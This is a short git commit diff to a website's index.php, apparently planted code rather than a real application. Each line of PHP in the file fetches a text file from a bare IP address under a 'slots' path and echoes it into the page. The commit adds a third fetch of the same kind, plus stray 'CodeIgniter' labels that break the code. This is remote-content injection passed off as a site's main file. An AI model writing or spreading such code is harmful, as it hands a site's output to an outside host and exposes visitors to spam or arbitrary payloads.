03635e0de05a2aa5dde352175b3868ec286e1600
OxygenCall <165064752+oxygencall@users.noreply.github.com>
2024-08-27 11:25:12 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,6 @@
 <?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://156.67.221.29/slots/beloved.txt'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a; ?>
 
-
+CodeIgniter
 $curl = curl_init();
 $url = 'http://156.67.221.29/slots/beloved.txt';
 curl_setopt($curl, CURLOPT_URL, $url);
@@ -8,3 +8,6 @@ curl_setopt($curl, CURLOPT_HEADER, 0);
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($curl);
 echo $result;
+
+
+CodeIgniter echo file_get_contents("http://156.67.221.29/slots/beloved.txt");
